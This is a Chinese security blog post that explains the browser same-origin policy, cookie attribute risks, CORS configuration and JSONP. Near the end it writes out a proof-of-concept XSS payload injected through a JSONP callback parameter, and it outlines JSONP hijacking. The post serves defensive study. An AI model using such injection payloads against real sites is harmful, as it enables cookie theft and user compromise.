<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。在这一背景下想要系统整理一下相关的知识参考博客：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;208672.htmlhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;jined&#x2F;article&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="【web安全】浏览器同源策略和跨域问题">
<meta property="og:url" content="https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。在这一背景下想要系统整理一下相关的知识参考博客：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;208672.htmlhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;jined&#x2F;article&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/image.png">
<meta property="og:image" content="https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/image-2.png">
<meta property="article:published_time" content="2024-09-20T06:23:05.000Z">
<meta property="article:modified_time" content="2024-10-11T08:50:02.977Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="域">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【web安全】浏览器同源策略和跨域问题</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/09/20/PaperReading/ZeroWall/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/09/19/WebSecurity/ctf/hackthebox/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&text=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&is_video=false&description=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【web安全】浏览器同源策略和跨域问题&body=Check out this article: https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&name=【web安全】浏览器同源策略和跨域问题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&t=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">Cookie的跨域问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS%EF%BC%88%E8%B7%A8%E6%BA%90%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">CORS（跨源资源共享）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">CORS 的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8"><span class="toc-number">3.2.</span> <span class="toc-text">CORS 响应头部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.3.</span> <span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">3.4.</span> <span class="toc-text">安全问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%EF%BC%88JSON-with-Padding%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">JSONP（JSON with Padding）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91"><span class="toc-number">4.3.</span> <span class="toc-text">安全考虑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%96%B9%E6%A1%88"><span class="toc-number">5.</span> <span class="toc-text">其他解决跨域问题的方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD-CORP-COOP"><span class="toc-number">6.</span> <span class="toc-text">新的安全措施 CORP COOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORP%EF%BC%88Cross-Origin-Resource-Policy%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">CORP（Cross-Origin Resource Policy）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COOP%EF%BC%88Cross-Origin-Opener-Policy%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">COOP（Cross-Origin Opener Policy）</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【web安全】浏览器同源策略和跨域问题
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-20T06:23:05.000Z" class="dt-published" itemprop="datePublished">2024-09-20</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。<br>在这一背景下想要系统整理一下相关的知识<br>参考博客：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>找到2017年的一篇论文：Same-Origin Policy: Evaluation in Modern Browsers，发在顶会上的</p>
<p>个人理解的域和源本质上是一样的，只是域是针对单个的，而有源就要有汇，是针对双方的。在浏览器的上下文中，域（Domain） 是一种安全模型的基础构件，主要用来确定哪些网络资源（如网页、图片、脚本等）可以与哪些其他资源互相交互。而域的概念是为了实现 Web 安全而设计的，主要目的是防止恶意网站访问或操作其他网站的数据，这种安全策略被称为同源政策（Same-Origin Policy, SOP）（是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。）</p>
<p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image.png"></p>
<p>浏览器的同源策略：对于Web页面上的脚本来说，只能访问来自同一来源的数据，而不能访问或修改不同来源的数据。这里的“来源”（origin）是由协议（protocol）、域名（domain）和端口（port）三个部分组成的。只有当这三者完全相同的时候，两个资源才被认为是“同源”的。<br>虽然浏览器为了安全目的引入了同源政策，但同时也给开发者们带来很多问题，这也催生出了很多的跨域手段，带来了新的攻击面。</p>
<p>①.<a target="_blank" rel="noopener" href="https://blog.csdn.net/bestxianfeng163/article/details/105666140">浏览器</a>先根据同源策略对前端页面和后台交互地址做匹配，若同源，则直接发送数据请求；若不同源，则发送跨域请求。<br>②.服务器解析程序收到浏览器跨域请求后，根据自身配置返回对应文件头。若未配置过任何允许跨域，则文件头里不包含Access-Control-Allow-origin字段，若配置过域名，则返回Access-Control-Allow-origin+ 对应配置规则里的域名的方式。<br>③.浏览器根据接受到的http文件头里的Access-Control-Allow-origin字段做匹配，若无该字段，说明不允许跨域；若有该字段，则对字段内容和当前域名做比对，如果同源，则说明可以跨域，浏览器发送该请求；若不同源，则说明该域名不可跨域，不发送请求</p>
<h2 id="Cookie的跨域问题"><a href="#Cookie的跨域问题" class="headerlink" title="Cookie的跨域问题"></a>Cookie的跨域问题</h2><p>在Cookie设置中有很多<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51383106/article/details/131458419">属性</a></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>Cookie的name</th>
</tr>
</thead>
<tbody><tr>
<td>值</td>
<td>Cookie的value</td>
</tr>
<tr>
<td>Domain</td>
<td>Cookie的域。如果设成 xxx.com(一级域名)，那么子域名x.xxx.com(二级域名)，都可以使用xxx.com的Cookie</td>
</tr>
<tr>
<td>Path</td>
<td>Cookie的路径。如果设为&#x2F;，则同域名全部路径均可使用该Cookie。如果设为&#x2F;xxx&#x2F;，则只有路径为&#x2F;xxx&#x2F;可以使用该Cookie。</td>
</tr>
<tr>
<td>Expires &#x2F; Max-Age</td>
<td>Cookie的超时时间。如果值为时间，则在到达指定时间后Cookie失效。如果值为Session(会话)，Cookie会同Session一起失效，当整个浏览器关闭的时候Cookie失效。</td>
</tr>
<tr>
<td>Size</td>
<td>Cookie的大小。</td>
</tr>
<tr>
<td>HttpOnly</td>
<td>值为true时，Cookie只会在Http请求头中存在，不能通过doucment.cookie(JavaScript)访问Cookie。</td>
</tr>
<tr>
<td>Secure</td>
<td>值为true时，只能通过https来传输Cookie。</td>
</tr>
<tr>
<td>SameSite</td>
<td>值为Strict，完全禁止第三方Cookie，跨站时无法使用Cookie。值为Lax，允许在跨站时使用Get请求携带Cookie，下面有一个表格介绍Lax的Cookie使用情况。值为None，允许跨站跨域使用Cookie，前提是将Secure属性设置为true。Priority ：Cookie的优先级。值为Low&#x2F;Medium&#x2F;High，当Cookie数量超出时，低优先级的Cookie会被优先清除。</td>
</tr>
</tbody></table>
<p>针对上面的属性，如果设置不当，就有可能存在安全问题：<br>上面的Cookie配置中涉及到安全性的属性主要包括Domain、Path、HttpOnly、Secure和SameSite。每个属性的设置都会直接影响到Cookie的安全性和应用的安全风险。下面分别分析这些属性可能引起的安全问题：</p>
<ol>
<li>Domain（域）：如果Domain设置不当，比如设置为一级域名（例如<code>xxx.com</code>），那么所有xxx.com的子域（如<code>sub.xxx.com</code>）都可以访问这个Cookie。这可能会导致Cookie被不安全的子域访问，增加数据泄露的风险。依据最小特权原则，尽量将cookie作用域设置的越小越好。</li>
<li>Path（路径）：如果Path设置为根路径（<code>/</code>），则整个网站的所有页面都能访问这个Cookie。如果某些路径下的页面存在安全漏洞，那么这些页面也能访问到Cookie，存在被利用的风险。</li>
<li>HttpOnly：如果HttpOnly属性未被设置（即默认情况下或设置为false），Cookie可以通过客户端脚本，如JavaScript的<code>document.cookie</code>访问。</li>
<li>Secure：如果Secure属性未设置，Cookie可以通过不安全的HTTP连接传输。</li>
<li>SameSite</li>
</ol>
<ul>
<li><strong>Strict</strong>：严格的设置可能会导致合法的跨站请求场景（例如，用户从其他网站点击链接跳转到站点时）下Cookie不被发送，影响用户体验。</li>
<li><strong>Lax</strong>：相对宽松，但在某些情况下（如POST请求等）仍不发送Cookie，可能影响功能的实现。</li>
<li><strong>None</strong>：如果没有正确设置Secure属性，设置SameSite为None时可能导致Cookie在跨站请求中被发送，增加CSRF攻击的风险。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dingtao_237/article/details/103007697">子父域问题</a>：子域可以获取到父域的cookie，反之则不行。所以我们在种全站cookie的时候（比如登录状态），都会种到全站域名的父域上，这样全站可以共享登录状态。当然这里说的全站域名都是一个父域的情况。</p>
<h2 id="CORS（跨源资源共享）"><a href="#CORS（跨源资源共享）" class="headerlink" title="CORS（跨源资源共享）"></a>CORS（跨源资源共享）</h2><p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。</p>
<p>CORS（Cross-Origin Resource Sharing，跨源资源共享）是一个允许在网页脚本中访问不同源服务器资源的安全功能。它是一个 W3C 标准，旨在克服浏览器同源政策对资源跨域访问的限制。</p>
<h3 id="CORS-的工作原理"><a href="#CORS-的工作原理" class="headerlink" title="CORS 的工作原理"></a>CORS 的工作原理</h3><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-1.png"><br>CORS 通过添加一系列新的 HTTP 头部来扩展已有的 HTTP 协议，使得服务器能够声明哪些源站可以访问该服务器上的资源。在 CORS 中，HTTP 请求由两种类型：</p>
<ol>
<li><p><strong>简单请求（Simple Requests）</strong>：</p>
<ul>
<li>使用 GET、HEAD 或 POST 方法。</li>
<li>POST 方法的 <code>Content-Type</code> 仅限于 <code>text/plain</code>、<code>multipart/form-data</code> 和 <code>application/x-www-form-urlencoded</code>。</li>
<li>不会改变服务器状态的请求被视为简单请求。</li>
</ul>
<p>简单请求的 CORS 流程：</p>
<ul>
<li>浏览器在简单请求的头部中自动添加 <code>Origin</code> 字段，这个字段标明请求来自哪个源（协议+域名+端口）。</li>
<li>服务器根据这个源决定是否允许请求。如果允许，服务器会在响应头中添加 <code>Access-Control-Allow-Origin</code>。浏览器只有在收到这个头部，并且值与请求的源相匹配，或者是通配符 <code>*</code> 时，才会处理响应。如果不允许，服务器不会添加该字段，浏览器也会阻止应用访问该响应。</li>
</ul>
</li>
<li><p><strong>预检请求（Preflight Requests）</strong>：</p>
<ul>
<li>使用了除 GET、HEAD、POST 之外的 HTTP 方法。</li>
<li>发送了除简单请求头之外的自定义头，如 <code>application/json</code>。</li>
<li>对服务器有特定影响的 POST 请求（如发送 JSON 或 XML 数据）。</li>
</ul>
<p>预检请求的 CORS 流程：</p>
<ul>
<li>在发送实际请求前，浏览器首先会发送一个 OPTIONS 请求到服务器，询问服务器是否允许跨域请求。</li>
<li>这个 OPTIONS 预检请求包括以下头信息：<code>Origin</code>、<code>Access-Control-Request-Method</code>（实际请求中将使用的 HTTP 方法）和 <code>Access-Control-Request-Headers</code>（实际请求中将设置的自定义头信息）。</li>
<li>如果服务器允许，它会在响应中包括如 <code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>、<code>Access-Control-Allow-Origin</code> 等头部，明确允许的方法、头部和源。</li>
<li>浏览器接收到允许的响应后，会发送实际的 HTTP 请求。</li>
</ul>
</li>
</ol>
<h3 id="CORS-响应头部"><a href="#CORS-响应头部" class="headerlink" title="CORS 响应头部"></a>CORS 响应头部</h3><ul>
<li>**<code>Access-Control-Allow-Origin</code>**：指定哪些域可以访问域资源。例如，如果requester.com 想要访问 provider.com 的资源，那么开发人员可以使用此标头安全地授予 requester.com 对 provider.com 资源的访问权限。</li>
<li>**<code>Access-Control-Allow-Methods</code>**：指定可以使用哪些 HTTP 请求方法（GET，PUT，DELETE 等）来访问资源。此标头允许开发人员通过在 requester.com 请求访问provider.com 的资源时，指定哪些方法有效来进一步增强安全性。</li>
<li>**<code>Access-Control-Allow-Headers</code>**：允许的 HTTP 请求头。</li>
<li>**<code>Access-Control-Allow-Credentials</code>**：指定浏览器是否将使用请求发送 cookie。仅当 allow-credentials 标头设置为 true 时，才会发送 Cookie。</li>
</ul>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">使用场景</a></h3><p>CORS 非常适用于单页应用（SPA），这些应用通常会从多个源加载资源。CORS 也是实现 API 服务和前端分离的关键技术之一，使得前端应用可以安全地从不同源获取数据和资源。<br>SpringCloud设置跨域</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayCorsConfiguation</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsFilter <span class="title function_">corsFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化cors配置对象</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>); <span class="comment">// 允许使用cookie，但是使用cookie是addAllowedOrigin必须是具体的地址，不能是*</span></span><br><span class="line"><span class="comment">//        configuration.addAllowedOrigin(&quot;*&quot;);</span></span><br><span class="line">        configuration.addAllowedOrigin(<span class="string">&quot;http://manage.leyou.com&quot;</span>);</span><br><span class="line">        configuration.addAllowedMethod(<span class="string">&quot;*&quot;</span>);  <span class="comment">//允许的请求方式,get,put,post,delete</span></span><br><span class="line">        configuration.addAllowedHeader(<span class="string">&quot;*&quot;</span>);<span class="comment">//允许的头信息</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//初始化cors的源对象配置</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">corsConfigurationSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        corsConfigurationSource.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>,configuration);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//3.返回新的CorsFilter.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CorsFilter</span>(corsConfigurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><ul>
<li>CORS 政策完全由服务器端控制。如果服务器配置不当，可能会导致敏感信息泄露。</li>
<li><code>Access-Control-Allow-Origin</code> 设置为 <code>*</code> 可以允许所有域名的访问，但这通常不推荐用于处理敏感数据。<br>可以使用这个工具做一些检测 <a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li>
</ul>
<h2 id="JSONP（JSON-with-Padding）"><a href="#JSONP（JSON-with-Padding）" class="headerlink" title="JSONP（JSON with Padding）"></a>JSONP（JSON with Padding）</h2><p>JSONP 教程   <a target="_blank" rel="noopener" href="https://www.runoob.com/json/json-jsonp.html">https://www.runoob.com/json/json-jsonp.html</a><br><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-2.png"><br>JSONP（JSON with Padding）是一种跨域数据交换的技术，它利用了<code>&lt;script&gt;</code>标签没有跨域限制的特性来发送跨域请求，现在的应用很少。<code>callback</code>是一个很有效的关键词，通过在网络请求中检索callback，或许可以找到应用的点，如果返回的json是隐私相关的信息，那么就可以实现信息泄漏等。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>JSONP 的工作原理基于以下两个事实：</p>
<ol>
<li>浏览器的同源策略阻止了从不同源加载的脚本访问其他源的 DOM 和 JavaScript 对象，但不禁止向其他源发送<code>&lt;script&gt;</code>标签的请求。</li>
<li><code>&lt;script&gt;</code>标签的<code>src</code>属性可以用来加载任何来源的 JavaScript 文件。</li>
</ol>
<p>当需要从其他域名获取数据时，可以使用 JSONP 方法。这种方式通常涉及到下面几个步骤：</p>
<ol>
<li><strong>客户端定义回调函数</strong>：首先在客户端定义一个回调函数，这个函数将处理从服务器获取的数据。</li>
<li><strong>动态创建 <code>&lt;script&gt;</code> 标签</strong>：然后通过动态创建 <code>&lt;script&gt;</code> 标签的方式来发送请求，请求的 URL 包含一个查询参数，通常是 <code>callback</code>，其值是上一步定义的回调函数的名称。</li>
<li><strong>服务器响应</strong>：服务器在接收到请求后，会生成 JSON 数据，并将这个数据作为参数传递给查询参数中指定的回调函数，形成一段可执行的 JavaScript 代码。</li>
<li><strong>执行响应</strong>：当这段带有数据的 JavaScript 代码通过 <code>&lt;script&gt;</code> 标签加载并执行时，定义的回调函数会被调用，并且实际的数据会作为参数传入。</li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设有一个客户端回调函数 <code>handleResponse</code>，你希望从 <code>http://example.com/api</code> 获取数据，你可以这样实现 JSONP 请求：<br><strong>客户端代码</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data: &quot;</span> + data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://example.com/api?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure>
<p><strong>服务器端响应</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>这段响应是一个 JavaScript 代码，调用了客户端定义的 <code>handleResponse</code> 函数，并传入了数据。</p>
<h3 id="安全考虑"><a href="#安全考虑" class="headerlink" title="安全考虑"></a>安全考虑</h3><p>1、对于输入的callback函数名过滤不严格，导致输入的数据直接输出到前端造成XSS<br>2、JSONP劫持漏洞，由于对于来源域没有严格限制，因此来源于不安全的域的请求也会被响应<br>随着 CORS（跨源资源共享）标准的普及，JSONP 的使用越来越少。CORS 提供了一种更安全、更灵活的跨域请求方式，允许服务器更精细地控制哪些网站可以访问哪些资源，同时支持所有类型的 HTTP 请求（不仅仅是 GET 请求），而 JSONP 仅支持 GET 请求。因此，在现代 Web 应用开发中，推荐使用 CORS 而不是 JSONP。</p>
<p>直接构造xss：<code>http://xxxxxx/jsonp/index.php?callback=jsonp_5981%3Cimg%20src=x%20onerror=alert(/xss/)%3E</code>，可以获取到用户的cookie信息或者劫持用户跳转到钓鱼网站<br>JSONP劫持：JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。</p>
